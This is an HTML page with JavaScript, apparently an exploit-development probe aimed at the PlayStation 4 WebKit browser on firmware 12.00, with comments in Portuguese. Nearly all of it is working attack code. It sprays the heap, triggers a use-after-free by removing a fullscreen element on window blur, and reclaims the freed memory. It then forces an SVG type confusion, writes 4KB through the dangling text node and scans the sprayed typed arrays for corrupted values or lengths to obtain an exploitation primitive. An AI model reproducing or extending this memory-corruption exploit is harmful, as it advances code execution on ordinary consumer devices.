<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Long Range Probe</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Long Range Overwrite → JSC Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 HEAP FENG SHUI INTERCALADO (MANTIDO)
function setupInterleavedFengShui(){
    log("[*] Iniciando Interleaved Heap Spray...");

    window.dom_spray = [];
    window.heap_spray = [];
    window.obj_spray = [];

    for(let i=0; i<6000; i++){
        let t = document.createTextNode("TXT_" + i);
        document.body.appendChild(t);
        window.dom_spray.push(t);

        let d1 = document.createElement("div");
        d1.innerHTML = "EL_" + i;
        document.body.appendChild(d1);
        window.dom_spray.push(d1);

        if(i < 5000){
            let f = new Float64Array(8);
            f[0] = i; 
            window.heap_spray.push(f);
            window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
        }
    }
    log("[*] Spray concluído!");
}

// ==========================
// HEAP SETUP (100% INALTERADO)
function setupHeap(){
    let arr=[];
    for(let i=0; i<5000; i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (MANTIDO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">AAAA</div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 LONG RANGE PROBE
function domOverlapProbe(fsTarget){
    log("---- LONG RANGE PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 3){
            log("[!!!] TEXTNODE CONFUSION");

            // 🚀 AUMENTAMOS O TIRO: 0x200 -> 0x1000 (4KB)
            try{
                n.data = "A".repeat(0x1000); 
                log("[PWN] Long range write OK");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCANNER
            try{
                // 1. Scan DOM
                for(let i=0;i<window.dom_spray.length;i++){
                    let obj = window.dom_spray[i];
                    if(obj.nodeType === 3 && (!obj.data || !obj.data.includes("TXT_"))){
                        log("[!!!] DOM CORRUPT @ " + i);
                        return;
                    }
                }

                // 2. Scan JSC Heap
                for(let i=0; i<window.heap_spray.length; i++){
                    // Checamos se o valor mudou (Jackpot de Valor)
                    if(window.heap_spray[i][0] !== i){
                        log("[$$$] JACKPOT! VALOR CORROMPIDO @ " + i);
                        log("[$$$] Novo valor: " + window.heap_spray[i][0]);
                        return;
                    }
                    // Checamos se o length mudou (Jackpot de Primitiva)
                    if(window.heap_spray[i].length !== 8){
                        log("[$$$] JACKPOT! LENGTH CORROMPIDO @ " + i);
                        log("[$$$] Novo length: " + window.heap_spray[i].length);
                        return;
                    }
                }
                log("[SCAN] Tudo intacto (Tentando aumentar alcance...)");

            }catch(e){
                log("[UAF] scan crash");
            }

        }
    }catch(e){
        log("[UAF] probe crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    // Três tentativas com intervalos para capturar a realocação
    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando teste...");
    setupInterleavedFengShui(); 
    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
